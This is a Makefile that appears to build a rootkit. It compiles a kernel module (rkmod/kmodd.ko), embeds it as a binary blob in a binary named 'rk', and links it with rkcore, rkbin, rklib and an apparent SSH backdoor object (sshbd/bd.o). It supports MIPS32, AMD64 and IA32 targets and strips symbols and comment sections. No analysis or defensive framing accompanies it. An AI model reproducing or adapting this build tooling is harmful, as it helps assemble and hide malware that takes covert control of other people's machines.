ARCH=__IA32__
ifeq ($(ARCH), __MIPS32__)
KFLAGS=-S -fomit-frame-pointer -G 0 -fpic -fvisibility=hidden -finhibit-size-directive
UFLAGS=-mno-abicalls
MFLAGS=-mips32
endif
ifeq ($(ARCH), __AMD64__)
KFLAGS=-S -fvisibility=protected -fPIC
MFLAGS=-m64
UFLAGS=
endif
ifeq ($(ARCH), __IA32__)
KFLAGS=-S
MFLAGS=
UFLAGS=
endif
export KFLAGS
export MFLAGS
export UFLAGS
CC=gcc
CFLAGS=-s -fno-builtin -nostdlib -nodefaultlibs
BASE=0xdeadb40
LDFLAGS=-Ttext=$(BASE) -static
OBJ=rkmod/kmodd.o rkcore/rkcore.o rkcore/rkopsig.o rkcore/rklib.o rkcore/rkdbg.o rkbin/*.o rklib/*.o sshbd/bd.o
all:
	@make clean
	@cd rkmod && make
	@ld -r -b binary -o rkmod/kmodd.o rkmod/kmodd.ko
	@objcopy --redefine-sym _binary_rkmod_kmodd_ko_size=_rkmod_size rkmod/kmodd.o
	@objcopy --redefine-sym _binary_rkmod_kmodd_ko_start=_rkmod_start rkmod/kmodd.o
	@cd rkbin  && make
	@cd sshbd  && make
	@cd rklib  && make
	@cd rkcore && make
	$(CC) $(LDFLAGS) $(CFLAGS) $(OBJ) -o rk
	@objcopy --remove-section=.comment rk
clean:
	@rm -rf *~
	@rm -rf rk
	@cd rkbin  && make clean
	@cd sshbd  && make clean
	@cd rklib  && make clean
	@cd rkmod  && make clean
	@cd rkcore && make clean

